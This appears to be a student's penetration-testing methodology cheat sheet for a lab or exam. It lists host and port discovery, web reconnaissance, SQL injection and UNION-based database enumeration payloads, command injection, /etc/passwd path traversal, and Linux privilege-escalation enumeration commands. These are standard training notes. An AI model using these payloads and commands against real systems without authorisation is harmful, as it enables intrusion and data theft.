#############################################
              ROT13 and BASE64
#############################################
methodology:
  step 1: always have notes open (draw.io)
    
Host Discovery
    for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
    from the closest machine to the network
    compare results to off limits
    
Port Discovery
    (setup dynamic tunnel to the furthest ip)
    sudo nmap -Pn -sT -T4 <ip> -p80,22,4444,2222,4242,9999,3389,8080
    sudo proxychains nmap -Pn -sT -T4 <ip> -p80,22,4444,2222,4242,9999,3389,8080
      windows if 445 or 3389
Port Interrogation
    nc <ip> <port>
  
Web Recon:
    nikto -h <ip>
    nmap -St -T4 <ip> -p80 --script http-enum.nse   #money
    nmap -St -T4 <ip> -p80 --script discovery
    
    login page (USERNAMES/PASSWORDS, GOLDEN STATEMENT DOES NOT WORK):
      ' OR 1='1
      if no useful information try a get request
      f12 network tab
        find POST request
        go to request tab, click raw
        ? after the php in the url and paste the raw url from the request tab

    file read page:
      ; whoami            #if nothing command injection doesnt work :(
      /../../../../../../../../../../../../etc/passwd
      
    Selection Page: ;#
      Identify vulnerable field, try every field
      Union SELECT 1,2,3<,4,5,6...>
        show what positions in the union statement will be displayed where on the table
      UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #      #GOAT
        Figures out what column are in what table
      UNION SELECT 1,2,@@version
        Displays version #

POST EXPLOITATION
  bash or /bin/bash if not already
  whoami
  hostname
  which gdb
  sudo -l                                           #GTFO
  find / -type f -perm /4000 2>/dev/null            #GTFO
  find / -type f -perm /2000 2>/dev/null            #GTFO
  find / -type f -perm /6000 2>/dev/null            #GTFO
  which gdb                       #if a box has gdb you will be doing a buffer overflow :(
  cat /etc/hosts
  cat /etc/crontab
  ls /etc/cron.d
  ls /var/tmp
  ls /tmp









